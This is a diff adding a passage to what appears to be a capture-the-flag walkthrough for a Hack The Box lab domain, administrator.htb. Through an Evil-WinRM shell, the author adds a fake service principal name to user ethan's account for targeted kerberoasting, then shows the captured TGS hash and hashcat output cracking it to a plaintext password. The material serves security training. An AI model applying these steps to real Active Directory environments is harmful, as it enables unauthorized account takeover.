@@ -745,3 +745,61 @@ Info: Downloading C:\Users\emily\Desktop\user.txt to user.txt
                                         
 Info: Download successful!
 ```
+set SPN on user ethan for kerberoasting:
+```bash
+*Evil-WinRM* PS C:\Users\emily\Documents> Get-ADUser ethan
+
+
+DistinguishedName : CN=Ethan Hunt,CN=Users,DC=administrator,DC=htb
+Enabled           : True
+GivenName         : Ethan
+Name              : Ethan Hunt
+ObjectClass       : user
+ObjectGUID        : 1a62f8b3-a5dd-4d55-8b37-464a32825662
+SamAccountName    : ethan
+SID               : S-1-5-21-1088858960-373806567-254189436-1113
+Surname           : Hunt
+UserPrincipalName : ethan@administrator.htb
+
+
+
+*Evil-WinRM* PS C:\Users\emily\Documents> Set-ADObject -Identity "CN=Ethan Hunt,CN=Users,DC=administrator,DC=htb" -Add @{servicePrincipalName="fake9/service9"}
+*Evil-WinRM* PS C:\Users\emily\Documents> Get-ADUser ethan -Properties ServicePrincipalName
+
+
+DistinguishedName    : CN=Ethan Hunt,CN=Users,DC=administrator,DC=htb
+Enabled              : True
+GivenName            : Ethan
+Name                 : Ethan Hunt
+ObjectClass          : user
+ObjectGUID           : 1a62f8b3-a5dd-4d55-8b37-464a32825662
+SamAccountName       : ethan
+ServicePrincipalName : {fake9/service9}
+SID                  : S-1-5-21-1088858960-373806567-254189436-1113
+Surname              : Hunt
+UserPrincipalName    : ethan@administrator.htb
+```
+
+crack kerberos ticket with hashcat output:
+```bash
+$krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator.htb/ethan*$0cca4541f5b4b69f5f11b98c5dafdfe2$33a6d6cce19b1f7e9e541dd57dc47fdad588f7a139807348923c13d1c99b0c9f905cb9bb02c03cc58d7ca5c24bdcce8f7f0b5f6fa847ba84b7f1c4cee255245448e41e0c4041a9fa822b5ec36cb0d324170e71ddd711e5606aff9324ecbab5bb9e4d156b0811ad23121e34a2ed6a670f3248a6718ac2ea08a48cb12cf31f92f8887dc6c10e55507488c8adf4192efce7ded3f7dc58ca83408723fd2e5e131bb0e4334070bd547b3897b1125ee4f249cd617653ac5ca1048851cef9fe084e5185640bf3e6a5d8f2d7b465fbf0ac069283da637ecb17df0f00beebac8906382b78253f283e56ff6f7802cb8ad237cb9c38daa363d7414fe1a176b50b74ab01e618142052f3c433f5a0fe2b37db23b3a6ed8c302682f08dc5e3ee31cf6ef308c344a7ed37ec5313ec5f651b67f1c95f1b6f0c04b0692ab6c6a16a01677597defc0054bb3ca50436367c7cdf3cf6aee8a224d0cc1713fff9ab9786d4febec95aec99b33ee085dd81a0d55a21a9dcade3ace48a92facc78efd0924a5392ced6ecd894dc4d25196d9b37593f1a5ba58160a773078dbe8f4ef4c8278397e0fc7f9496c2c51c544460279c090acc4565839079ac2f5c3b89068f505cdc92fed830a737e1db4b68842d83d64948aaef89ce44cc2f91fb5ed6ea341155dbfb21491cdd5028aa29923648e92dfb3c4fa4371df32e8e3431e6011be2d1084b241f22cced0e05e88701a4099e12bcaf92c250e8d294efd5e5363a78eaacb93985d81e9a60e4bcf28bcdcfac0c4da06bd78a3d171ab82ca01d9fa21364ae0056aa7cf585fd68608c8864e58ce28075ce829dc0e2e0dac6112b9be3c9119ddb1f500c5665fe46a4b0426d414ae48225d4d47ae7c51eaf89ddb7bc964e102e7f4316ba9bc542bda1d39bd0f09ede0a6d9ecf65e7f4ce16043765f21cbe677edf7c5007627d6eb0515046a5b6e91dc226c7a414cf84a3465e0524e3ab6e5b1b602c46b3a7f2272bffd887c99b3e9efc5e9c2934296e3b36911f3828d9ecdf639384b4c76b94587705fef41fb4aafc124b9cea3fc32ab515e93c9bc1c70ba6f5a4013728ba2e341aa9baaeabf74ef64e8af8d9a418ac1d1e19b72f1d1e693b26880329c9ffacb317517d6ff302c66a0da098d05f7418bce21c6eb480c5a8abd44b25a60c404f61c8c5ff27bd030a5519cef56656f2ba4c36b69976db808d6fdcc0c5b79bcf98dd66011ba81adcb000fd3ccd6181a6f81b8fda092a55154e58810b592078cfb6e8567f4fb5fa17604b1cc591b9fc845a430840bb259de2dc6f43cc3fb66034a45bab227697cf998492c8a96ef9d684dcae4ca9d06986f2ccff875f5611c6d94a418099a25fab4a238ad671c2f0f22aa5e7e296fe249e858b445ca5211d0b47ee8e46104ba8eae965960703d8e53bb2c2b2666acfe10fb6a25d72bf8f171cec3795a08a301393803a6c0edd1dd323b3eb78e5eaa49f1efea71b0e6f20acf0939eb594f4fadb338b87771277d71578a045a4a1b53dfaf8f5d9dc9523f00ecce484875a:limpbizkit
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
+Hash.Target......: $krb5tgs$23$*ethan$ADMINISTRATOR.HTB$administrator....84875a
+Time.Started.....: Sun Dec  8 01:06:12 2024 (0 secs)
+Time.Estimated...: Sun Dec  8 01:06:12 2024 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (./rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:  5189.4 kH/s (1.79ms) @ Accel:1024 Loops:1 Thr:1 Vec:16
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 16384/14344384 (0.11%)
+Rejected.........: 0/16384 (0.00%)
+Restore.Point....: 0/14344384 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
+Candidate.Engine.: Device Generator
+Candidates.#1....: 123456 -> christal
+Hardware.Mon.#1..: Temp: 44c Util:  9%
+```
